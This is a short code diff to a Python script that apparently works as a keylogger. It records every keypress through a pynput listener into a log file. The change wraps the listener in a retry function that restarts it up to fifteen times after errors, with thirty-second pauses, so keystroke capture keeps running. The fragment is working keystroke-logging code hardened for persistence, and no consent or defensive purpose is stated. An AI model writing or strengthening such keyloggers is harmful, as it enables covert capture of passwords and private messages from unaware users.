@@ -42,9 +42,17 @@ logging.basicConfig(filename=f"{logging_dir}/{nomfile}", level=logging.DEBUG, fo
 def on_press(key):        
     print(key)
     logging.info(key)
-    
-with Listener(on_press=on_press) as lis:
-    lis.join()
+ 
+def TRY_KEY(n,att):
+    if n > 0:
+        try:
+            with Listener(on_press=on_press) as lis:
+                lis.join()
+                
+        except:
+            print(" ----------------------------------------! ERREUR de listener key")
+            time.sleep(att)
+            TRY_KEY(n-1,att)  
 
-   	  
+TRY_KEY(15,30)   	  
 
